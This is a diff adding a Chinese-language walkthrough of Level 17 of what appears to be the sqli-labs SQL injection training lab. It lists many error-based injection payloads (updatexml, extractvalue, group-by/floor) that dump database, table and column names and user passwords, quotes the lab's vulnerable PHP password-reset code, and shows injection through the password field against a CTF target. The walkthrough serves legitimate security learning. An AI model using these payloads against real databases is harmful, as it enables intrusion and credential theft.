@@ -2056,3 +2056,318 @@ admin") and if(left((select table_name from information_schema.tables where tabl
 
 + 爆破数据就不写了，都是一样的思路使用时间盲注，利用页面是否有延迟判断返回数据是否正确
 
+
+
+###  Level-17  修改密码 
+
+#### 方法一
+
++ 首先爆破数据库名
+
+~~~ shell
+admin
+1' and updatexml(1,concat(0x7e,database(),0x7e),1) #
+~~~
+
+![Less-17_1](./img/Less-17_1.PNG)
+
+爆破得到的数据库名是"security"
+
+
+
++ 爆破数据表名
+
+~~~ shell
+admin
+1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
+~~~
+
+![Less-17_2](./img/Less-17_2.PNG)
+
+
+
+爆破得到的数据表是
+
+~~~ tex
+emails,referers,uagents,users
+~~~
+
+
+
++ 爆破列名
+
+~~~ shell
+admin
+1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
+~~~
+
+![Less-17_3](./img/Less-17_3.PNG)
+
+
+
+爆破得到的列名是
+
+~~~ tex
+id,username,password
+~~~
+
+
+
++ 爆破数据
+
+~~~ shell
+admin
+1' and (updatexml(1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#
+~~~
+
+![Less-17_4](./img/Less-17_4.PNG)
+
+
+
+爆破出现错误：
+
+~~~ tex
+You can't specify target table 'users' for update in FROM clause
+~~~
+
+原因是：
+
+~~~ tex
+mysql数据不支持查询和更新是同一张表,所以需加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出该账户的原始密码,如果查询时不是users表就不报错
+~~~
+
+
+
+#### 方法二
+
+~~~ tex
+	根据页面展示是一个密码重置页面，即已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入，用三种mysql报错注入
+~~~
+
+![e3e7da7e0e554cd9b13afa172b911963](./img/e3e7da7e0e554cd9b13afa172b911963.png)
+
+~~~ tex
+这里介绍的报错注入可以选择extractvalue()报错注入，updatexml()报错注入和group by()报错注入。下面简单说一下者三种报错注入的原理。
+~~~
+
+
+
++ **extractvalue报错注入**
+
+~~~ tex
+extractvalue(XML_document,XPath_string)
+	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+	作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样
+~~~
+
+~~~ shell
+1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
+1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
+ 
+1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
+1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))# 
+ 爆字段名
+ 
+1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
+1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
+~~~
+
+
+
++ **updatexml报错注入**
+
+~~~ tex
+UPDATEXML (XML_document, XPath_string, new_value)
+	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+	第三个参数：new_value，String格式，替换查找到的符合条件的数据
+	作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值
+	当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。
+~~~
+
+~~~ shell
+最后爆字段和上面一样如果加一个中间表
+
+123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
+ 
+123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
+   爆字段名
+ 
+123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
+爆密码该格式针对mysql数据库。
+
+爆其他表就可以，下面是爆emails表
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
+ 
+1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+~~~
+
+
+
++ **group by报错注入**
+
+[深入理解group by报错注入](https://blog.csdn.net/m0_53065491/article/details/121893986)
+
+~~~ shell
+group by报错注入比前面两个复杂一点
+
+123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+ 
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+ 
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+ 
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+~~~
+
+
+
+#### 方法三
+
++ 看下源码
+
+~~~ php
+<?php
+//including the Mysql connect parameters.
+include("../sql-connections/sql-connect.php");
+error_reporting(0);
+
+function check_input($value){
+	if(!empty($value)){
+		// truncation (see comments)
+		$value = substr($value,0,15);
+		}
+		// Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc()){
+			$value = stripslashes($value);
+		}
+		// Quote if not a number
+		if (!ctype_digit($value)){
+			$value = "'" . mysql_real_escape_string($value) . "'";
+		}
+		else{
+		$value = intval($value);
+		}
+	return $value;
+	}
+
+// take the variables
+if(isset($_POST['uname']) && isset($_POST['passwd']))
+
+{
+//making sure uname is not injectable
+$uname=check_input($_POST['uname']);  
+$passwd=$_POST['passwd'];
+
+//logging the connection parameters to a file for analysis.
+$fp=fopen('result.txt','a');
+fwrite($fp,'User Name:'.$uname."\n");
+fwrite($fp,'New Password:'.$passwd."\n");
+fclose($fp);
+
+
+// connectivity          //查询语句
+@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
+$result=mysql_query($sql);       //应该是上面一句语句的查询结果
+$row = mysql_fetch_array($result);     //把查询结果变成一个无序数组
+//echo $row;
+	if($row)
+	{
+  		//echo '<font color= "#0000ff">';	
+		$row1 = $row['username'];  	
+		//echo 'Your Login name:'. $row1;
+		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
+		mysql_query($update);
+  		echo "<br>";
+	
+		if (mysql_error())
+		{
+			echo '<font color= "#FFFF00" font size = 3 >';
+			print_r(mysql_error());          //返回报错信息！！！！！！！！
+			echo "</br></br>";
+			echo "</font>";
+		}
+		else
+		{
+			echo '<font color= "#FFFF00" font size = 3 >';
+			//echo " You password has been successfully updated " ;		
+			echo "<br>";
+			echo "</font>";
+		}
+	
+		echo '<img src="../images/flag1.jpg"   />';	
+		//echo 'Your Password:' .$row['password'];
+  		echo "</font>";
+	
+  	}
+	else  
+	{
+		echo '<font size="4.5" color="#FFFF00">';
+		//echo "Bug off you Silly Dumb hacker";
+		echo "</br>";
+		echo '<img src="../images/slap1.jpg"   />';
+		echo "</font>";  
+	}
+}
+?>
+~~~
+
+可以看到这里进行查询的语句是"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"。
+进行更改密码的语句是"UPDATE users SET password = '$passwd' WHERE username='$row1'"。
+
+总览代码全文，发现，虽然查询和更新语句我们能对更新语句（看下文）进行注入，但是，查询和更新语句的结果不会回显，说白了就是注了也白注。
+
+但是也可以发现，代码是回给我们返回报错信息的，那我们就可以进行报错注入。
+
+因为代码中$row和$row1一定要存在，才能进行更新语句，并且能返回报错。所以用户名一定要存在，使查询语句返回数据（用户名：DUMB），以及我们不能从查询语句注入，只能从更新语句"UPDATE users SET password = '$passwd' WHERE username='$row1'"注入，并且注入点是$passwd。
+![c68209535e66d03ffc4fa98e0c57d2d4](./img/c68209535e66d03ffc4fa98e0c57d2d4.png)
+
+很容易看出闭合是单引号`'`，更新语句注入点前不是select语句，回显位可以不用管。
+
+放一张思维导图里面对报错注入的归整：
+
+![80c731e1fd8d44540abade0c29412796](./img/80c731e1fd8d44540abade0c29412796.png)
+
+
+
++ 爆库
+
+~~~ shell
+uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))--+&submit=Submit
+~~~
+
+
+
++ 爆表
+
+~~~ shell
+uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e))--+&submit=Submit
+~~~
+
+
+
++ 爆列
+
+~~~ shell
+uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flag'),0x7e))--+&submit=Submit
+~~~
+
+
+
++ 爆字段值
+
+~~~ shell
+uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select group_concat(flag4) from ctfshow.flag),0x7e))--+&submit=Submit
+
+倒着读
+uname=DUMB&passwd=123456' and extractvalue(1,concat(0x7e,(select reverse(group_concat(flag4)) from ctfshow.flag),0x7e))--+&submit=Submit
+~~~
+
+
+
